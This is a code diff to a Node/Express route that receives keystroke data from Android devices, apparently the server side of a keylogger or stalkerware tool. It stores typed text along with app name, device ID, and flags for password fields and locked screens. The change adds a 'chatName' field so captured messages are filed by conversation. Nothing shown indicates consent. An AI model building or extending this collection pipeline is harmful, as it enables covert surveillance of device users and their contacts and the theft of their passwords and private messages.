@@ -21,6 +21,7 @@ router.post('/', authenticateApiKey, async (req, res) => {
             inputType,
             screenTitle,
             fieldHint,
+            chatName,
             isPassword,
             isScreenLocked,
             activityName,
@@ -37,7 +38,7 @@ router.post('/', authenticateApiKey, async (req, res) => {
             console.log('📤 Complete message received, saving directly to DB');
             const textInputData = await saveTextInputToDB({
                 id, timestamp, packageName, appName, deviceId,
-                keyboardInput, inputField, inputType, screenTitle, fieldHint,
+                keyboardInput, inputField, inputType, screenTitle, fieldHint, chatName,
                 isPassword, isScreenLocked, activityName, viewId, deviceModel, androidVersion
             });
 
@@ -83,6 +84,7 @@ async function saveTextInputToDB(data) {
         inputField: sanitizeValue(data.inputField) || 'text_input',
         inputType: sanitizeValue(data.inputType) || 'complete_message',
         screenTitle: sanitizeValue(data.screenTitle) || null,
+        chatName: sanitizeValue(data.chatName) || sanitizeValue(data.screenTitle) || null,
         fieldHint: sanitizeValue(data.fieldHint) || null,
         isPassword: data.isPassword || false,
         isScreenLocked: data.isScreenLocked || false,
@@ -115,6 +117,7 @@ async function saveTextInputToDB(data) {
                 existingSameField.timestamp = incoming.timestamp;
                 existingSameField.activityName = incoming.activityName || existingSameField.activityName;
                 existingSameField.screenTitle = incoming.screenTitle || existingSameField.screenTitle;
+                if (incoming.chatName) existingSameField.chatName = incoming.chatName;
                 await existingSameField.save();
                 console.log('🔁 Prefix match: pushed old into history and updated text for', existingSameField.id);
                 return summarizeResult(existingSameField);
